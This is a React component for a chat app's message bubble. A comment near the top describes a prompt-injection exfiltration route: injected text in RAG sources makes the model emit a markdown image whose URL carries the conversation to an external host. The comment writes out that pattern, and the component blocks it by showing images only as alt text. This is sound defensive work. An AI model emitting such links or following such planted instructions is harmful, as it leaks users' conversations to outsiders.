'use client'

import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import remarkMath from 'remark-math'
import remarkCjkFriendly from 'remark-cjk-friendly'
import rehypeKatex from 'rehype-katex'
import SourcesPanel from '@/app/components/SourcesPanel'
import { displayedContent, type Message } from '@/lib/chat/messages'

// LLMの出力(回答・思考過程)を表示するときのMarkdown設定。画像は読み込まず代替テキストだけ表示する。
// 画像を表示すると、RAG資料や貼り付けたテキストに仕込まれた指示でモデルに
// ![](https://外部/?q=会話内容) を出力させ、ブラウザの画像読み込みで会話内容を外部へ送らせる
// ことができてしまうため。
const LLM_MARKDOWN_COMPONENTS: Components = {
  img({ alt }) {
    return <span className="text-gray-500 dark:text-zinc-400">[画像: {alt || '（説明なし）'}]</span>
  },
}

const TOKEN_COLORS = [
  'bg-rose-100 dark:bg-rose-900/40',
  'bg-amber-100 dark:bg-amber-900/40',
  'bg-lime-100 dark:bg-lime-900/40',
  'bg-sky-100 dark:bg-sky-900/40',
  'bg-violet-100 dark:bg-violet-900/40',
  'bg-orange-100 dark:bg-orange-900/40',
]

type Props = {
  msg: Message
  // このメッセージが現在ストリーミング中の回答か(生成中でなくても、直前まで対象だった場合を含む)
  isStreamingTarget: boolean
  loading: boolean
  // 生成開始からの経過秒数。応答が遅いときの案内に使う。
  elapsedSec: number
  onToggleThinking: () => void
  onStop: () => void
  onRegenerate: () => void
  onVersionNav: (delta: number) => void
  onDeleteVersion: () => void
  onTokenToggle: () => void
  onToggleSources: () => void
}

// チャットの吹き出し1件分。回答には思考過程・トークン表示・再生成・バージョン切り替え・参照資料を付ける。
export function ChatMessageItem({
  msg,
  isStreamingTarget,
  loading,
  elapsedSec,
  onToggleThinking,
  onStop,
  onRegenerate,
  onVersionNav,
  onDeleteVersion,
  onTokenToggle,
  onToggleSources,
}: Props) {
  const isGenerating = loading && isStreamingTarget
  return (
    <div className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}>
      {msg.role === 'assistant' && (
        <div className="flex-none w-7 h-7 rounded-full bg-ocean-700 flex items-center justify-center text-white text-xs font-bold mr-2 mt-1">
          AI
        </div>
      )}
      <div className="max-w-[90%] sm:max-w-[75%] flex flex-col gap-1">
        {/* 思考プロセス表示 */}
        {msg.role === 'assistant' && (msg.thinking !== undefined || (msg.thinkingEnabled && !msg.thinkingDone && msg.content === '')) && (
          <div className="rounded-xl border border-amber-200 dark:border-amber-800 overflow-hidden text-sm">
            <button
              type="button"
              onClick={onToggleThinking}
              className="w-full flex items-center gap-2 px-3 py-2 text-xs font-medium text-amber-700 dark:text-amber-400 bg-amber-50 dark:bg-amber-900/20 hover:bg-amber-100 dark:hover:bg-amber-900/30 transition-colors"
            >
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M15 14c.2-1 .7-1.7 1.5-2.5 1-.9 1.5-2.2 1.5-3.5A6 6 0 0 0 6 8c0 1 .2 2.2 1.5 3.5.7.7 1.3 1.5 1.5 2.5"/>
                <path d="M9 18h6"/>
                <path d="M10 22h4"/>
              </svg>
              {!msg.thinkingDone ? (
                <span className="animate-pulse">思考中...</span>
              ) : (
                <span>思考プロセス</span>
              )}
              {msg.thinkingDone && (
                <svg
                  width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"
                  className={`ml-auto transition-transform ${msg.showThinking ? 'rotate-180' : ''}`}
                >
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              )}
            </button>
            {(msg.showThinking || !msg.thinkingDone) && msg.thinking && (
              <div className="px-3 py-2 text-xs text-amber-900 dark:text-amber-300 bg-amber-50/60 dark:bg-amber-900/10 border-t border-amber-200 dark:border-amber-800 max-h-48 overflow-y-auto prose prose-xs dark:prose-invert max-w-none [&_*]:text-amber-900 dark:[&_*]:text-amber-300 [&_h1]:text-sm [&_h2]:text-sm [&_h3]:text-xs [&_pre]:bg-amber-100 dark:[&_pre]:bg-amber-900/30">
                <ReactMarkdown
                  remarkPlugins={[remarkGfm, remarkCjkFriendly]}
                  components={LLM_MARKDOWN_COMPONENTS}
                >
                  {msg.thinking}
                </ReactMarkdown>
                {!msg.thinkingDone && <span className="animate-pulse">▌</span>}
              </div>
            )}
          </div>
        )}

        {/* メッセージ本体 */}
        <div
          className={`rounded-2xl px-4 py-2.5 text-sm leading-relaxed break-words ${
            msg.role === 'user'
              ? 'bg-ocean-700 text-white rounded-tr-sm whitespace-pre-wrap'
              : 'bg-white dark:bg-zinc-800 text-gray-800 dark:text-zinc-100 border border-gray-200 dark:border-zinc-700 rounded-tl-sm prose prose-sm dark:prose-invert max-w-none'
          }`}
        >
          {msg.content === '' && msg.role === 'assistant' ? (
            <div className="flex flex-col gap-1.5">
              {msg.stopped ? (
                <p className="not-prose flex items-center gap-1 text-xs text-gray-400 dark:text-zinc-500">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor" className="flex-none">
                    <rect x="5" y="5" width="14" height="14" rx="2" />
                  </svg>
                  途中で停止しました（回答は生成されませんでした）
                </p>
              ) : (
                <>
                  <span className="flex gap-1 py-0.5">
                    <span className="w-1.5 h-1.5 bg-gray-400 rounded-full animate-bounce [animation-delay:0ms]" />
                    <span className="w-1.5 h-1.5 bg-gray-400 rounded-full animate-bounce [animation-delay:150ms]" />
                    <span className="w-1.5 h-1.5 bg-gray-400 rounded-full animate-bounce [animation-delay:300ms]" />
                  </span>
                  {isStreamingTarget && elapsedSec >= 8 && (
                    <div className="not-prose flex items-center gap-2 text-xs text-amber-600 dark:text-amber-400">
                      <span>応答に時間がかかっています…（{elapsedSec}秒経過）</span>
                      <button
                        type="button"
                        onClick={onStop}
                        className="underline decoration-dotted hover:text-amber-700 dark:hover:text-amber-300"
                      >
                        停止する
                      </button>
                    </div>
                  )}
                </>
              )}
            </div>
          ) : msg.role === 'assistant' ? (
            <>
              {msg.showTokens && msg.tokens ? (
                <div className="not-prose">
                  <p className="text-sm leading-loose font-mono break-all">
                    {msg.tokens.map((t, ti) => (
                      <span
                        key={ti}
                        className={`${TOKEN_COLORS[ti % TOKEN_COLORS.length]} rounded px-0.5 cursor-default`}
                        title={`ID: ${t.id}`}
                      >
                        {t.piece}
                      </span>
                    ))}
                  </p>
                </div>
              ) : (
                <ReactMarkdown
                  remarkPlugins={[remarkGfm, remarkMath, remarkCjkFriendly]}
                  rehypePlugins={[rehypeKatex]}
                  components={LLM_MARKDOWN_COMPONENTS}
                >
                  {displayedContent(msg)}
                </ReactMarkdown>
              )}
              {msg.stopped && !isGenerating && (
                <p className="not-prose mt-1 flex items-center gap-1 text-xs text-gray-400 dark:text-zinc-500">
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor" className="flex-none">
                    <rect x="5" y="5" width="14" height="14" rx="2" />
                  </svg>
                  途中で停止しました
                </p>
              )}
              {!isGenerating && msg.content && (
                <div className="not-prose flex items-center justify-between mt-1 gap-2">
                  {/* 再生成ボタン */}
                  <button
                    type="button"
                    onClick={onRegenerate}
                    disabled={loading}
                    title="回答を再生成"
                    className="flex items-center gap-1 rounded px-1.5 py-0.5 text-xs text-gray-400 dark:text-zinc-500 hover:text-gray-600 dark:hover:text-zinc-300 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                  >
                    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8" />
                      <path d="M3 3v5h5" />
                    </svg>
                    再生成
                  </button>
                  {/* バージョンナビゲーション＋削除（複数バージョン時のみ） */}
                  {msg.versions && msg.versions.length > 0 && (
                    <div className="flex items-center gap-0.5 text-xs text-gray-400 dark:text-zinc-500 select-none">
                      <button
                        type="button"
                        onClick={() => onVersionNav(-1)}
                        disabled={msg.displayVersionIdx === 0}
                        title="前のバージョン"
                        className="w-5 h-5 flex items-center justify-center rounded hover:text-gray-600 dark:hover:text-zinc-300 disabled:opacity-30 disabled:cursor-not-allowed transition-colors text-base leading-none"
                      >
                        ‹
                      </button>
                      <span className="tabular-nums px-0.5">
                        {(msg.displayVersionIdx ?? msg.versions.length) + 1} / {msg.versions.length + 1}
                      </span>
                      <button
                        type="button"
                        onClick={() => onVersionNav(1)}
                        disabled={msg.displayVersionIdx === undefined}
                        title="次のバージョン"
                        className="w-5 h-5 flex items-center justify-center rounded hover:text-gray-600 dark:hover:text-zinc-300 disabled:opacity-30 disabled:cursor-not-allowed transition-colors text-base leading-none"
                      >
                        ›
                      </button>
                      <button
                        type="button"
                        onClick={onDeleteVersion}
                        disabled={loading}
                        title="このバージョンを削除"
                        className="w-5 h-5 flex items-center justify-center rounded hover:text-red-500 dark:hover:text-red-400 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                      >
                        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                          <line x1="18" y1="6" x2="6" y2="18" />
                          <line x1="6" y1="6" x2="18" y2="18" />
                        </svg>
                      </button>
                    </div>
                  )}
                  {/* トークンボタン */}
                  <button
                    type="button"
                    onClick={onTokenToggle}
                    disabled={msg.displayVersionIdx !== undefined}
                    title={msg.showTokens ? 'マークダウン表示に戻す' : 'トークン単位で表示'}
                    className={`flex items-center gap-1 rounded px-1.5 py-0.5 text-xs transition-colors ${
                      msg.showTokens
                        ? 'bg-ocean-100 text-ocean-700 dark:bg-ocean-900/40 dark:text-ocean-400'
                        : 'text-gray-400 dark:text-zinc-500 hover:text-gray-600 dark:hover:text-zinc-300 disabled:opacity-30 disabled:cursor-not-allowed'
                    }`}
                  >
                    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <line x1="4" y1="9" x2="20" y2="9" />
                      <line x1="4" y1="15" x2="20" y2="15" />
                      <line x1="10" y1="3" x2="8" y2="21" />
                      <line x1="16" y1="3" x2="14" y2="21" />
                    </svg>
                    {msg.showTokens
                      ? `${msg.tokens!.length} tokens`
                      : 'トークン'}
                  </button>
                </div>
              )}
            </>
          ) : (
            msg.content
          )}
        </div>

        {/* 参照した資料（RAG）。sourcesが未受信(undefined)のうちは表示しない */}
        {msg.role === 'assistant' && msg.sources !== undefined && (
          <SourcesPanel
            sources={msg.sources}
            open={!!msg.showSources}
            onToggle={onToggleSources}
          />
        )}
      </div>
    </div>
  )
}
